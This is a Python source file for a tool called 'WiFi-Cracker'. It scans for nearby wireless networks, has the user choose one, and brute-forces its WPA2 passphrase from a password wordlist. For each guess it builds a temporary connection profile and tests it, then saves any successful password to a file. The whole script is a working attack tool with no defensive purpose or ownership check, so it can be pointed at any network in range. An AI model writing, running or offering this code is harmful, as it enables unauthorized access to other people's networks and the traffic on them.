from pywifi import PyWiFi, Profile, const
from functools import partial
from termcolor import cprint
from itertools import cycle
import operator
import time
import sys
import os


PASSWORD_LIST_PATH = r"password-list.txt"
FIGLET = '''\n
   _____ _               ____
  / ____(_)             |  __|
 | (___  _ _ __   __ _  | |__ 
  \___ \| | '_ \ / _` | |  __|
  ____) | | | | | (_| |_| |  
 |_____/|_|_| |_|\__,_(_)_| 
\n\n'''


class Cracker:
    is_windows = (sys.platform == 'win32')
    colors = ['blue', 'red']

    def __init__(self, interface_idx=0):
        self.wifi = PyWiFi()
        self.interfaces = self.wifi.interfaces()
        self.interface = self.interfaces[interface_idx]

        self.colors = iter(cycle(Cracker.colors))
        self.password_list = []

    def crack(self, target):
        start_time = time.time()

        for tries, password in enumerate(self.password_list, start=1):
            color = next(self.colors)
            cprint(f' Testing: {password}', color=color)

            if self.test_wifi(target, password):
                delta = time.time() - start_time
                self.beep()
                print('\n', format(' ', '-<30'), sep='')
                cprint(f' PASSWORD: <{password}>', color='green')
                print(f' {tries} passwords have tested in {delta:.2f}s')
                print(format(' ', '-<30'))

                return password

    def test_wifi(self, ssid, password):
        self.interface.disconnect()
        profile = self.create_temp_profile(ssid, password)
        self.interface.add_network_profile(profile)
        self.interface.connect(profile)
        time.sleep(.7)

        if self.interface.status() == const.IFACE_CONNECTED:
            self.interface.remove_network_profile(profile)
            return True

        else:
            self.interface.remove_network_profile(profile)
            return False

    @staticmethod
    def create_temp_profile(ssid, password):
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        return profile

    def load_password_list(self, passwords):
        self.password_list = list(filter(lambda x: len(x)>=8, passwords))

    def load_password_list_from_file(self, path):
        with open(path) as handler:
            self.load_password_list(handler.read().split('\n'))

    def set_interface(self, idx):
        self.interface = self.interfaces[idx]

    def scan(self):
        self.interface.scan()
        for i in range(12):
            for char in '/-\|':
                print(f'\r Scanning... {char}', end='')
                time.sleep(.15)

        return self.interface.scan_results()

    def beep(self):
        if self.is_windows:
            beep()



def select(items):
    print('\n')
    for idx, item in enumerate(items, 1):
        print(f' {idx}_ {item}')
        time.sleep(.7)

    time.sleep(1)
    selected_item = input("\n Select a host to start cracking: ")

    while True:
        try:
            selected_item = int(selected_item)
            assert 1 <= selected_item <= len(items)
            selected_item -= 1
            break

        except AssertionError:
            print(f'\n "{selected_item}" is not a valid host index')
            selected_item = input('\n Please enter a valid host: ')

        except:
            if selected_item in items:
                selected_item = items.index(selected_item)
                break

            else:
                print(f'\n "{selected_item}" is not a valid host name')
                selected_item = input('\n Please enter a valid host: ')


    return items[selected_item]


def print_figlet():
    for line in FIGLET.splitlines():
        print(line)
        time.sleep(.2)


def beep(duration=500):
    import winsound
    winsound.Beep(700, duration)
    winsound.Beep(1000, duration)



if __name__ == '__main__':
    os.system('cls')

    cracker = Cracker()
    cracker.load_password_list_from_file(PASSWORD_LIST_PATH)

    time.sleep(.5)
    print('\n Welcome to WiFi-Cracker (written by Sina.F)\n')
    time.sleep(1)

    networks = cracker.scan()
    hosts = list(map(operator.attrgetter('ssid'), networks))

    if hosts:
        target = select(hosts)
        print()

        password = cracker.crack(target)
        with open('password.txt', 'w') as file_handler:
            file_handler.write(password)

    else:
        print('\n\n No WiFi available!\n')


    print_figlet()
    time.sleep(1)
    input(' Press <enter> to exit...')
